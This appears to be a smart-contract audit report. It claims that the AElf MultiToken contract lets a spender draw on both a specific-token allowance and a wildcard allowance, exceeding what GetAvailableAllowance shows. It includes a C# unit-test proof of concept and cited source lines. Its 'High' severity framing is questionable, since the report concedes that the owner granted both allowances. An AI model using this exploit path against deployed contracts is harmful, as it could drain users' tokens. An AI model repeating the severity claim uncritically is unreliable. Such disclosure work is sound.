# Audit Report

## Title
Cumulative Allowance Exploitation via Misleading GetAvailableAllowance Math.Max Logic

## Summary
The MultiToken contract's allowance system stores specific token allowances and wildcard allowances ("*" for all tokens, "COLLECTION-*" for NFT collections) independently. The view function `GetAvailableAllowance` uses `Math.Max` to display only the maximum single-source allowance, suggesting this represents the total available amount. However, the enforcement logic in `DoTransferFrom` uses a fallback strategy that allows sequential consumption of multiple independent allowances for the same token, enabling spenders to transfer significantly more tokens than the displayed amount indicates.

## Finding Description

The vulnerability stems from the mismatch between how allowances are displayed versus how they are consumed.

**Allowance Storage**: Each allowance type is stored at independent keys in the state mapping [1](#0-0) . When a user approves specific tokens (e.g., "ELF") and wildcard tokens (e.g., "*"), these create separate storage entries.

**Display Logic**: The `GetAvailableAllowance` view function retrieves allowances and returns the maximum value using `Math.Max` [2](#0-1) . This communicates to users that only the maximum single-source allowance is available.

**Consumption Logic**: The `GetAllowance` helper function implements a fallback strategy [3](#0-2) . It first checks the specific token allowance, and if insufficient, falls back to checking wildcard allowances. Each transfer deducts from whichever allowance source is used [4](#0-3) .

**Exploitation Path**:
1. Owner approves 100 ELF specifically: `Approve(spender, "ELF", 100)`
2. Owner approves 50 ELF via wildcard: `Approve(spender, "*", 50)` 
3. User queries `GetAvailableAllowance("ELF")` and sees 100 (the Math.Max result)
4. Spender calls `TransferFrom` for 100 ELF - consumes specific allowance
5. Spender calls `TransferFrom` again for 50 ELF - consumes wildcard allowance
6. Total transferred: 150 ELF, despite view function showing only 100

No validation prevents this cumulative consumption across multiple allowance types for the same token.

## Impact Explanation

**Direct Financial Impact**: Token owners lose more funds than intended. A user who approves 1000 tokens specifically and 500 via wildcard believes they've limited exposure to 1000 tokens (as shown by `GetAvailableAllowance`), but a spender can actually transfer 1500 tokens - a 50% excess.

**Affected Users**: 
- All token holders using wildcard approvals for convenience
- DeFi protocol integrations that may use wildcards for flexibility
- NFT collection owners using collection-level approvals

**Severity**: This is a High severity issue because it enables unauthorized token transfers beyond the limits users believe they've set, with no way to detect the cumulative behavior from the provided view function. The Math.Max logic in `GetAvailableAllowance` clearly indicates the design intent was to show the maximum available from any single source, not a cumulative total.

## Likelihood Explanation

**Attack Complexity**: Low. The exploit requires only:
1. Owner approving multiple allowance types (natural use case)
2. Spender calling `TransferFrom` multiple times (standard operation)

**Feasibility**: High. Users naturally may:
- Set specific allowances for known trusted contracts
- Add wildcard allowances for convenience with other services
- Not realize these allowances are cumulative rather than alternative

**No Detection**: The existing test suite only validates individual allowance types in isolation [5](#0-4) . No tests validate the cumulative consumption behavior, making this an unexpected characteristic.

**Attacker Profile**: Any approved spender - no special privileges required beyond what the owner explicitly granted.

## Recommendation

**Option 1 - Fix GetAvailableAllowance** (Recommended): 
Change `GetAvailableAllowance` to return the cumulative sum of all allowance types, matching actual enforcement behavior. This makes the display accurate.

**Option 2 - Fix GetAllowance**:
Modify `GetAllowance` to track which allowance sources have been used for each token and prevent consuming multiple sources for the same token. Add a consumption tracking mechanism.

**Option 3 - Make Allowances Mutually Exclusive**:
When approving a specific token, automatically clear any wildcard allowances for that token, ensuring only one allowance type can exist at a time.

## Proof of Concept

```csharp
[Fact]
public async Task CumulativeAllowanceExploit_Test()
{
    // Setup: Create and issue ELF tokens
    await TokenContractStub.Create.SendAsync(new CreateInput
    {
        Symbol = "ELF",
        TokenName = "ELF Token",
        TotalSupply = 1000000,
        Decimals = 8,
        Issuer = DefaultAddress,
        IsBurnable = true,
        IssueChainId = _chainId
    });
    
    await TokenContractStub.Issue.SendAsync(new IssueInput
    {
        Symbol = "ELF",
        Amount = 200,
        To = DefaultAddress
    });
    
    // Owner approves 100 ELF specifically
    await TokenContractStub.Approve.SendAsync(new ApproveInput
    {
        Symbol = "ELF",
        Amount = 100,
        Spender = User1Address
    });
    
    // Owner also approves 50 ELF via wildcard
    await TokenContractStub.Approve.SendAsync(new ApproveInput
    {
        Symbol = "*",
        Amount = 50,
        Spender = User1Address
    });
    
    // Check GetAvailableAllowance - shows only 100 (Math.Max)
    var availableAllowance = await TokenContractStub.GetAvailableAllowance.CallAsync(
        new GetAllowanceInput
        {
            Owner = DefaultAddress,
            Spender = User1Address,
            Symbol = "ELF"
        });
    availableAllowance.Allowance.ShouldBe(100); // User believes limit is 100
    
    var user1Stub = GetTester<TokenContractImplContainer.TokenContractImplStub>(
        TokenContractAddress, User1KeyPair);
    
    // Exploit: Transfer 100 ELF (exhausts specific allowance)
    await user1Stub.TransferFrom.SendAsync(new TransferFromInput
    {
        From = DefaultAddress,
        To = User1Address,
        Symbol = "ELF",
        Amount = 100
    });
    
    // Exploit: Transfer another 50 ELF (uses wildcard allowance)
    await user1Stub.TransferFrom.SendAsync(new TransferFromInput
    {
        From = DefaultAddress,
        To = User1Address,
        Symbol = "ELF",
        Amount = 50
    });
    
    // Verify: 150 ELF transferred despite GetAvailableAllowance showing 100
    var finalBalance = await TokenContractStub.GetBalance.CallAsync(
        new GetBalanceInput
        {
            Owner = User1Address,
            Symbol = "ELF"
        });
    finalBalance.Balance.ShouldBe(150); // VULNERABILITY: 150 > 100 displayed
}
```

## Notes

This vulnerability exploits the semantic mismatch between the display function (`GetAvailableAllowance` using `Math.Max`) and the enforcement function (`GetAllowance` using fallback logic). The Math.Max operation strongly suggests the design intent was for allowances to be alternative sources rather than cumulative, but the implementation fails to enforce this. The wildcard feature appears underdocumented, making this behavior unexpected and dangerous for users who trust the view function to accurately represent their approval exposure.

### Citations

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L273-273)
```csharp
        State.Allowances[Context.Sender][spender][actualSymbol] = amount;
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Views.cs (L80-80)
```csharp
        allowance = Math.Max(allowance, GetAllSymbolAllowance(input.Owner,input.Spender,out _));
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_NFT_Actions.cs (L94-94)
```csharp
        State.Allowances[from][spender][allowanceSymbol] = allowance.Sub(amount);
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_NFT_Actions.cs (L97-116)
```csharp
    private long GetAllowance(Address from, Address spender, string sourceSymbol, long amount,
        out string allowanceSymbol)
    {
        allowanceSymbol = sourceSymbol;
        var allowance = State.Allowances[from][spender][sourceSymbol];
        if (allowance >= amount) return allowance;
        var tokenType = GetSymbolType(sourceSymbol);
        if (tokenType == SymbolType.Token)
        {
            allowance = GetAllSymbolAllowance(from, spender, out allowanceSymbol);
        }
        else
        {
            allowance = GetNftCollectionAllSymbolAllowance(from, spender, sourceSymbol, out allowanceSymbol);
            if (allowance >= amount) return allowance;
            allowance = GetAllSymbolAllowance(from, spender, out allowanceSymbol);
        }

        return allowance;
    }
```

**File:** test/AElf.Contracts.MultiToken.Tests/BVT/TokenApplicationTests.cs (L536-649)
```csharp
    public async Task MultiTokenContract_TransferFrom_Nft_Global_Test()
    {
        await CreateNft();
        await TokenContractStub.Issue.SendAsync(new IssueInput
        {
            Symbol = "ABC-1",
            Amount = 100,
            To = DefaultAddress,
            Memo = "test"
        });
        await TokenContractStub.Issue.SendAsync(new IssueInput
        {
            Symbol = "ABC-1",
            Amount = 200,
            To = User1Address,
            Memo = "test"
        });
        var balance = await TokenContractStub.GetBalance.CallAsync(new GetBalanceInput
        {
            Owner = DefaultAddress,
            Symbol = "ABC-1"
        });
        balance.Balance.ShouldBe(100);
        balance = await TokenContractStub.GetBalance.CallAsync(new GetBalanceInput
        {
            Owner = User1Address,
            Symbol = "ABC-1"
        });
        balance.Balance.ShouldBe(200);
        await TokenContractStub.Approve.SendAsync(new ApproveInput
        {
            Amount = 1000,
            Symbol = "*",
            Spender = User1Address
        });
        
        await TokenContractStub.Approve.SendAsync(new ApproveInput
        {
            Amount = 1,
            Symbol = "ABC-*",
            Spender = User1Address
        });
        var allowance = await TokenContractStub.GetAllowance.CallAsync(new GetAllowanceInput
        {
            Owner = DefaultAddress,
            Spender = User1Address,
            Symbol = "ABC-1"
        });
        allowance.Allowance.ShouldBe(0);
        allowance = await TokenContractStub.GetAllowance.CallAsync(new GetAllowanceInput
        {
            Owner = DefaultAddress,
            Spender = User1Address,
            Symbol = "ELF"
        });
        allowance.Allowance.ShouldBe(0);
        {
            var realAllowance = await TokenContractStub.GetAvailableAllowance.CallAsync(new GetAllowanceInput
            {
                Owner = DefaultAddress,
                Spender = User1Address,
                Symbol = "ABC-1"
            });
            realAllowance.Allowance.ShouldBe(1000);
        }
        {
            var realAllowance = await TokenContractStub.GetAvailableAllowance.CallAsync(new GetAllowanceInput
            {
                Owner = DefaultAddress,
                Spender = User1Address,
                Symbol = "ELF"
            });
            realAllowance.Allowance.ShouldBe(1000);
        }
        var user1Stub =
            GetTester<TokenContractImplContainer.TokenContractImplStub>(TokenContractAddress, User1KeyPair);
        var result2 = await user1Stub.TransferFrom.SendAsync(new TransferFromInput
        {
            Amount = 50,
            From = DefaultAddress,
            Memo = "test",
            Symbol = "ABC-1",
            To = User1Address
        }); 
        result2.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
        {
            var realAllowance = await TokenContractStub.GetAllowance.CallAsync(new GetAllowanceInput
            {
                Owner = DefaultAddress,
                Spender = User1Address,
                Symbol = "ABC-1"
            });
            realAllowance.Allowance.ShouldBe(0);
        }
        allowance = await TokenContractStub.GetAvailableAllowance.CallAsync(new GetAllowanceInput
        {
            Owner = DefaultAddress,
            Spender = User1Address,
            Symbol = "ABC-1"
        });
        allowance.Allowance.ShouldBe(1000-50);
        balance = await TokenContractStub.GetBalance.CallAsync(new GetBalanceInput
        {
            Owner = DefaultAddress,
            Symbol = "ABC-1"
        });
        balance.Balance.ShouldBe(50);
        balance = await TokenContractStub.GetBalance.CallAsync(new GetBalanceInput
        {
            Owner = User1Address,
            Symbol = "ABC-1"
        });
        balance.Balance.ShouldBe(250);
    }
```
